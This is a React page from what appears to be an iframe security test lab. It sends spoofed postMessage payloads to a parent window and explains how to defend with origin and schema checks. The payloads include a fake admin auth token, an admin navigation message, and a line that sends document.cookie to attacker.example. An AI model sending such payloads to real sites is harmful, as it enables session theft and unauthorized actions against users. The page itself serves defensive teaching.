"use client";

import { useState } from "react";
import { findScenario } from "@/lib/scenarios";
import { ScenarioHeader } from "@/app/ScenarioHeader";
import { EmbedSnippet } from "@/app/EmbedSnippet";
import { Log, useLog } from "@/app/Log";

const PRESET_PAYLOADS = [
  { label: "단순 string", data: "hello-from-attacker" },
  { label: "auth 류 객체", data: { type: "AUTH", token: "FAKE-JWT.eyJ...", role: "admin" } },
  {
    label: "router 류 객체",
    data: { type: "NAVIGATE", path: "/admin/settings" },
  },
  {
    label: "iframe-resize 류 객체",
    data: { type: "iframe-resizer", height: 99999 },
  },
  {
    label: "스크립트 문자열 (eval-trap 탐색용)",
    data: "fetch('https://attacker.example/exfil?c='+document.cookie)",
  },
];

const PostMessagePage = () => {
  const scenario = findScenario("post-message")!;
  const { lines, push, clear } = useLog();
  const [target, setTarget] = useState("*");

  const send = (data: unknown) => {
    push(`parent.postMessage(${JSON.stringify(data)}, "${target}")`);
    try {
      window.parent.postMessage(data, target as string);
      push("전송 완료");
    } catch (e) {
      push(`전송 실패: ${(e as Error).message}`);
    }
  };

  return (
    <>
      <ScenarioHeader scenario={scenario} />
      <EmbedSnippet slug="post-message" />

      <h2>실행</h2>
      <div className="kv">
        <div className="k">target origin</div>
        <div>
          <input
            value={target}
            onChange={(e) => setTarget(e.target.value)}
            placeholder='"*" 또는 정확한 origin'
          />
        </div>
      </div>
      <div className="actions">
        {PRESET_PAYLOADS.map((p, i) => (
          <button key={i} className="danger" onClick={() => send(p.data)}>
            {p.label}
          </button>
        ))}
        <button onClick={clear}>로그 초기화</button>
      </div>
      <Log lines={lines} />

      <h2>해설</h2>
      <ul>
        <li>
          postMessage 는 cross-origin 통신용으로 의도된 API 입니다. SOP 가 막아
          주지 않습니다. <strong>부모 쪽에서 origin 검증</strong> 을 제대로 해야
          합니다.
        </li>
        <li>
          알렌 같은 부모가 <code>iframe-resizer</code>, 결제 위젯, 유튜브 IFrame
          API 등을 위해 message 리스너를 두고 있다면, 그 리스너의 메시지 포맷을
          흉내내서 보내는 게 흔한 공격 패턴입니다.
        </li>
        <li>
          차단 방법: 부모 쪽 <code>event.origin</code> 정확히 검증 + 메시지 타입
          / 스키마 검증. sandbox 에서는 <code>sandbox=&quot;&quot;</code> (빈 값)
          여야 postMessage 까지 막힙니다.
        </li>
        <li>
          부모 message 리스너 fingerprinting 은{" "}
          <a href="/scenarios/parent-message-listener-probe">probe 페이지</a> 에서
          더 다양한 페이로드로 시도할 수 있습니다.
        </li>
      </ul>
    </>
  );
};

export default PostMessagePage;
